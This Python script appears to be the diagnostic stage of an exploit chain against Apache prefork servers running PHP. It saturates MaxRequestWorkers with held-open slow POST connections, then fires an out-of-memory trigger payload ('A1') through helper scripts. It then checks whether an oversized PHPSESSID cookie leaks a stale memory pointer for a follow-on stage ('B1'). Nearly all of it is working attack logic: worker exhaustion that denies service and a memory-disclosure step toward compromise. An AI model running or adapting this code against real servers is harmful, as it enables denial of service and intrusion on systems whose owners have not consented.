#!/usr/bin/env python3
"""Remote diagnostic: probe a target without needing error log access.

Determines MaxRequestWorkers, whether A1 triggers OOM, whether the
worker survives, and whether the stale PS(id) is readable.

usage:
  python3 diag_remote.py --host 192.168.155.10 --port 80
"""
from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
PURE = os.path.join(HERE, "pure")
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def quick_get(host: str, port: int, timeout: float = 10.0) -> bytes:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(("GET /index.php HTTP/1.0\r\nHost: %s\r\n\r\n" % host).encode())
    resp = bytearray()
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp.extend(chunk)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def hold_one(host: str, port: int, timeout: float = 5.0):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(("POST /index.php HTTP/1.1\r\nHost: %s\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Content-Length: 1048576\r\n\r\nx" % host).encode())
    return s


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--max-probe", type=int, default=300,
                    help="max workers to probe (default 300)")
    args = ap.parse_args()

    # ── Step 1: Server header ──────────────────────────────────
    print("[1/5] Probing server header...")
    try:
        resp = quick_get(args.host, args.port)
        for line in resp.split(b"\r\n"):
            low = line.lower()
            if low.startswith(b"server:") or low.startswith(b"x-powered-by:"):
                print("      %s" % line.decode("latin1", "replace"))
    except Exception as exc:
        print("      connection failed: %r" % exc)
        return 1

    # ── Step 2: Count MaxRequestWorkers ────────────────────────
    print("[2/5] Counting MaxRequestWorkers (up to %d)..." % args.max_probe)
    holders = []
    last_ok = 0
    for i in range(args.max_probe):
        try:
            s = hold_one(args.host, args.port)
            holders.append(s)
            last_ok = i + 1
        except OSError:
            break
        if (i + 1) % 50 == 0:
            print("      %d holders connected..." % (i + 1))
        time.sleep(0.01)

    # verify we've saturated: try one more GET with short timeout
    time.sleep(1.0)
    saturated = False
    try:
        quick_get(args.host, args.port, timeout=5.0)
        print("      %d holders but server still responds — not saturated" % len(holders))
        if len(holders) >= args.max_probe - 1:
            print("      MaxRequestWorkers > %d (increase --max-probe)" % args.max_probe)
        else:
            print("      possibly event/worker MPM (not prefork)")
    except Exception:
        saturated = True
        print("      saturated at %d holders (MaxRequestWorkers ≈ %d)" % (
            len(holders), len(holders) + 1))

    if not saturated:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        print("\n[!] Cannot saturate workers — exploit requires prefork MPM")
        return 1

    # release one holder to free a worker for the exploit
    holders.pop().close()
    time.sleep(0.5)

    # ── Step 3: Verify the free worker responds ────────────────
    print("[3/5] Checking free worker responds...")
    try:
        resp = quick_get(args.host, args.port, timeout=10.0)
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        cookie_len = 0
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"set-cookie: phpsessid="):
                cookie_len = len(line)
        print("      status: %s  (Set-Cookie len: %d)" % (status, cookie_len))
    except Exception as exc:
        print("      free worker not responding: %r" % exc)
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        return 1

    # ── Step 4: Fire A1 and check if worker survives ──────────
    print("[4/5] Sending A1 (OOM trigger)...")
    tmp = tempfile.mkdtemp(prefix="p2s-diag-")
    a1 = os.path.join(tmp, "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                    "--out", a1, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL)
    try:
        subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
                        "--host", args.host, "--port", str(args.port),
                        "--body-file", a1, "--path", "/index.php" + Q,
                        "--timeout", "180",
                        "--save-response", os.path.join(tmp, "a1.resp")],
                       check=True, timeout=200)
        a1_resp = open(os.path.join(tmp, "a1.resp"), "rb").read()
        print("      A1 response: %d bytes" % len(a1_resp))
        if a1_resp:
            status = a1_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print("      status: %s" % status)
    except subprocess.TimeoutExpired:
        print("      A1 timed out (180s) — body may not have delivered")
        a1_resp = b""
    except subprocess.CalledProcessError as exc:
        print("      A1 send failed: %r" % exc)
        a1_resp = b""

    time.sleep(2.0)

    # check if the worker is still alive
    print("[5/5] Probing worker after A1...")
    try:
        resp = quick_get(args.host, args.port, timeout=15.0)
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        cookie_line = b""
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"set-cookie: phpsessid="):
                cookie_line = line
        cookie_len = len(cookie_line)

        print("      worker alive: %s" % status)
        print("      Set-Cookie length: %d bytes" % cookie_len)

        if cookie_len > 10000:
            print("      ✓ STALE POINTER DETECTED — oversized Set-Cookie (%d bytes)" % cookie_len)
            print("        the leak is working, B1 should proceed")
            # decode and check for pointers
            val = cookie_line[len(b"Set-Cookie: PHPSESSID="):].split(b";")[0]
            dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
            print("        decoded session id: %d bytes" % len(dec))
        elif cookie_len > 0:
            print("      normal Set-Cookie (%d bytes) — stale pointer NOT active" % cookie_len)
            print("      A1 may not have triggered OOM, or worker was replaced")
        else:
            print("      no Set-Cookie — session module may not be in stale state")
            print("      check: is session.upload_progress.enabled = On?")
    except Exception as exc:
        print("      worker NOT responding after A1: %r" % exc)
        print("      the worker likely crashed (segfault, not just OOM bailout)")
        print("      B1 will always get 0 bytes — the stale pointer is lost")

    # cleanup
    for s in holders:
        try:
            s.close()
        except OSError:
            pass
    print("\n[*] Done. Holders released.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
